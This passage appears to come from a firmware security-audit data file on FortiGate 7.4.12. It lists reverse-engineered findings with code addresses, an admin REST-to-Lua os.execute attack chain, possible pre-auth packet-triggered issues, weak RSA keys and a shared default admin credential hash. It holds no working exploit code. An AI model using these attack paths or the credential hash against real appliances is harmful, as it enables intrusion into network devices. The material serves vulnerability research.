                 "stack buffer (65,544 bytes: lea rbp, [rsp+0x7e0]) fits within 67,560-byte frame; "
                 "DoS surface remains: nested archive bomb (67KB stack consumed per recursion level); "
                 "if nest-limit counter at 0x263149 is per-session rather than per-connection, compound archives "
                 "can exhaust stack across sessions; bzip2 block CPU (O(n^2) worst case) remains a DoS vector; "
                 "no pre-auth memory corruption; severity downgraded from MEDIUM CANDIDATE to LOW; "
                 "source: 7z-CAB fork + bzip2-avail_out confirmation (2026-09-15)",

        "FGT-F47: LOW CANDIDATE -- libav.so.new (FGT7412 May 2026, 7.4MB) CAB CFFILE filename extraction not analyzed: "
                 "CAB CFHEADER parser at 0x1254e1 (MSCF magic check via strncmp, string at rodata 0x40e126); "
                 "reads CFHEADER fields byte-by-byte (manual endianness handling); "
                 "attributes byte at [rbx+0x22] controls extended header; "
                 "CFFILE filename parsing in subsequent function NOT reached during analysis; "
                 "CAB CFFILE structure: filename is NULL-terminated ASCII at end of CFFILE record (variable length, no size field); "
                 "if CAB filename parsed with strcpy into fixed buffer and using same vtable as ZIP entries = same overflow as FGT-F42; "
                 "dispatch table mapping for CAB not confirmed (not found via LEA or CALL analysis); "
                 "status CANDIDATE LOW: filename extraction chain untraced; source: 7z-CAB fork 2026-09-15",

        "FGT-F48: DENIED -- FALSE POSITIVE -- libav.so.new OLE2 memmove is fully bounded (confirmed 2026-09-15): "
                 "dispatch table entry [35] id=0x2d (fp10=0x10ff40, fp18=0x110340, cleanup=0x110e80); "
                 "fp10 at 0x10ff88: mov esi, 0x3e8 (1000 bytes); call 0xbd8b0 -- struct allocation is 1000 bytes; "
                 "rbx+0xdc offset = 220 bytes into struct; buffer available at [rbx+0xdc] = 1000-220 = 780 bytes; "
                 "UTF-16LE conversion at 0x2f6cf0 called with edx=0xff=255 (hardcoded in handler at 0x1104a7); "
                 "conversion body: cmp rdx, 0x1ff; ja stack-path; max write = 255 bytes per epilogue at 0x2f6dcf; "
                 "255 bytes < 780 bytes available -- no overflow; "
                 "subsequent strrchr + memmove (in-place within 255-byte content) also bounded; "
                 "OLE2 directory entry name is effectively capped at 255 bytes by the UTF-16LE conversion maxlen; "
                 "NO vulnerability; prior candidate status was based on allocation size not confirmed -- now confirmed 1000 bytes; "
                 "source: OLE2-confirmation fork (2026-09-15)",

        "FGT-F49: MEDIUM CANDIDATE -- libips.so.new (FGT7412 May 2026, 13.8MB) network-triggered LuaJIT table injection via packet data: "
                 "function at 0x760d10 (network packet processor): cmp byte ptr [rdi], 0xa -- classifies packet type; "
                 "0x760d91/0x760daf: call 0xbc920 (PLT:inet_ntop) x2 -- converts packet src/dst IPs to strings; "
                 "0x760e03: call 0xbc550 (PLT:__snprintf_chk) -- formats 16 bytes from [rbx+0x20] as hex with %02x format; "
                 "0x760e13: call 0x7e0d90 (ips_lua_prepare_call) -- sets up LuaJIT call state; PRE-AUTH TRIGGERABLE via live network traffic; "
                 "after ips_lua_prepare_call: function at 0x7e0f40 (ips_lua_set_field) called 3x to build Lua table: "
                 "field 'session_id' = 32-char hex string from [rbx+0x20] (packet field, __snprintf_chk-formatted); "
                 "field 'src_ip' = inet_ntop output (IPv4 max 15 chars, IPv6 max 39 chars); "
                 "field 'dst_ip' = inet_ntop output (same bounds); "
                 "0x760e23: cvtsi2sd xmm0, [rbp-0xf8] -- packet integer field to LuaJIT double (pushed via NaN-boxing); "
                 "0x760e73: movabs rdx, 0xfffd800000000000; or rax, rdx -- LuaJIT NaN-boxing for string TValue; "
                 "Lua function invoked with this table receives packet-derived strings as args; "
                 "ATTACK SURFACE: (1) if any Lua IPS rule executes packet field as code (loadstring/os.execute) "
                 "that is pre-auth RCE via crafted packet -- severity depends on rule content (admin-configured); "
                 "(2) if session_id field from [rbx+0x20] is not bounded before snprintf, and snprintf buffer "
                 "is on stack with insufficient size, pre-auth stack overflow -- needs snprintf buffer size confirmed; "
                 "(3) ips_lua_prepare_call (0x7e0d90) Lua VM state not checked for corruption before stack push -- "
                 "if concurrent packet processing causes Lua VM reentry, NaN-boxed values may be misinterpreted; "
                 "CONFIRMED SAFE: __snprintf_chk call uses bounded size (r13-r15 = remaining bytes); "
                 "CONFIRMED SAFE: inet_ntop output is bounded (INET_ADDRSTRLEN=16, INET6_ADDRSTRLEN=46); "
                 "NOT CONFIRMED: ips_lua_prepare_call (0x7e0d90) internals -- Lua function name and VM state validation untraced; "
                 "NOT CONFIRMED: whether Lua IPS rules can execute packet field content as code; "
                 "NOT CONFIRMED: whether [rbx+0x20] (session_id source) is attacker-controlled network payload or internal flow key; "
                 "strings at rodata: 0xa8e6a5='session_id', 0xa8e6b0='src_ip', 0xa8e6b7='dst_ip'; "
                 "0xa89080='[%d@%d]%s: failed to allocate content buffer'; 0xa89220='content_buffer_append'; "
                 "source: libips.so.new 0x760d10 disassembly (2026-09-15); status CANDIDATE MEDIUM",

        "FGT-F41: MEDIUM -- libips.so.new IPS CMDB Lua config chain (FGT7412, authenticated admin path): "
                 "ips_init_engine_from_cmdb string at rodata VA 0xa65af0 confirms IPS engine initializes from CMDB config; "
                 "function at 0x1d6d90 (large IPS engine state machine) contains ips_luacfg_init references at 0x1d9027 and 0x1d96aa; "
                 "ips_luacfg_init loads Lua config from CMDB (custom IPS rule Lua code); "
                 "internal Lua function wrappers confirmed in libips.so.new: "
                 "ips_lua_dostring (0x14e940, ref from 0x14ea36), ips_lua_loadbuffer (0x14ea60, ref from 0x14eaf8), "
                 "ips_lua_pcall (0x14e2c0, ref from 0x14e3fd), ips_lua_newstate (0x1513e0, ref from 0x1514d1); "
                 "ips_lua_prepare_call at 0x7e0d90 (NaN-boxing + LuaJIT VM call setup); "
                 "ips_lua_load (0x1c755a in Lua init at 0x1c6c80), ips_lua_require (0x1c460b in prepare_lua_state 0x1c3fa0); "
                 "ips_luacfg_parse_app_grp_filters referenced at 0x787584 in function 0x782b90; "
                 "attack path: authenticated admin sets custom IPS Lua rule via REST API "
                 "(/api/v2/cmdb/ips/custom -> api_cmdb_v2-handler -> handle_cli_req_v2 -> cmdb_save_with_children -> cmdbsvr "
                 "-> ips_init_engine_from_cmdb -> ips_luacfg_init -> Lua rule execution in IPS VM -> os.execute(cmd)); "
                 "severity MEDIUM: requires admin authentication; no known auth bypass in this chain; "
                 "load_rule_file (dispatch [11] at 0xe5da0) parses binary TLV format (16-bit type, 14-bit length); "
                 "bounds check confirmed at 0xe6177 (jg -> truncation at 0xe6742): no unchecked TLV length copy found; "
                 "modify_custom_rule (dispatch [15] at 0xe7190) processes custom rules via CMDB path; "
                 "source: libips.so.new rodata 0xa65af0 (ips_init_engine_from_cmdb), "
                 "0x1d9027/0x1d96aa (ips_luacfg_init refs in 0x1d6d90), 0xc87fa0 (Lua C API dispatch 74 entries)",
    ],
    "7.4.12 datafs/fgt_512.key": "ANALYZED -- FGT-F28: 512-bit RSA private key; modulus CFB821074C...; "
                                   "cert issued 2011-02-21 (LEGACY; CN=support old CA); expires 2038; NOT referenced in fortism_config.json; usage in FGT 7.4.12 unconfirmed",
    "7.4.12 datafs/etc/cert/cert.conf": "ANALYZED -- FGT-F29a: default_bits=1024 (CSR template weak default)",
    "7.4.12 datafs/etc/ssh/moduli":     "ANALYZED -- FGT-F29b: OpenBSD 2015 v1.14, 268 entries, 49 x 1535-bit groups; unmodified in 10+ years",

    "FGT7412 hardware appliance (May 2026)": {
        "status":            "ANALYZED -- datafs key files + fortism_config.json",
        "kernel":            "Linux 4.19.13 (root@build, gcc unknown); bzImage 7.5MB; built 2026-05-05",
        "fgt2.key modulus":  "A75C115F... (matches FGT 7.4.12 + FGT 8.0.0 VM + FFW 8.0.0; FGT-F27 scope confirmed hardware)",
        "fgt_512.key":       "CFB821074C... (matches FGT 7.4.12; FGT-F28 confirmed hardware appliance)",
        "default_admin_enc": "ENC XXUp2ozpdysrQ (same as FFW 8.0.0 hardware; shared default credential hash cross-product)",
        "fortism_policy": {
            "domains":              36,
            "all_exec_flags_set":   "35/36 domains have anon-mem-exec=1, heap-exec=1, stack-exec=1, file-mod-exec=1, regain-root=1",
            "file_mod_exec_all":    "ALL 36 domains have file-mod-exec=1 (FGT-F31 -- new field vs 7.4.12)",
            "exception":            "TERMINAL domain: no anon-mem-exec/heap-exec/stack-exec/regain-root; only file-mod-exec=1",
            "cloud_daemon_writes":  "GCPD writes system.admin; WAAGENT writes system.admin + system.global (FGT-F30)",
            "ALL_ACCESS_domain": {
                "description":  "New domain in FGT7412; absent in FGT 7.4.12 datafs",
                "id":           34,
                "flags":        "all exec flags=1, regain-root=1, default_act=INCLUDE",
                "binaries":     ["/bin/httpsd", "/bin/scimd", "/bin/cloudinitd", "/bin/confsyncd",
                                 "/bin/extenderd", "/bin/fnbamd", "/bin/forticron", "/bin/hasync", "/bin/http_authd"],
                "severity":     "CRITICAL -- httpsd (internet-facing web GUI + REST API) in zero-restriction domain (FGT-F32)",
            },
        },
    },
}
